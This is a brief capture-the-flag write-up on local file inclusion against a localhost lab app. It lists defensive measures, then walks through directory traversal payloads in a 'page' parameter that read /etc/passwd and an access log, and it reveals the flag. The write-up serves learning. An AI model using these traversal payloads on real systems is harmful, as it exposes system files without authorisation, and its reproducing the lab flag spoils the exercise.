Vulnerability name : Local File Inclusion

How to defend: Always validate and sanitize user inputs, sensitive files should need privileged/admin access, use a web application firewall

The page parameter could be vulnerable to local file inclusion so we test it and we get a hint that we're on the right track.

http://localhost:8080/index.php?page=../../../../etc/passwd

This gives us "ALMOST"

http://localhost:8080/index.php?page=../../../../../var/log/httpd/access.log

Here we have "STILL NOPE"

And we go through a few more until this URL

http://localhost:8080/index.php?page=../../../../../../../etc/passwd

```
Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0
```
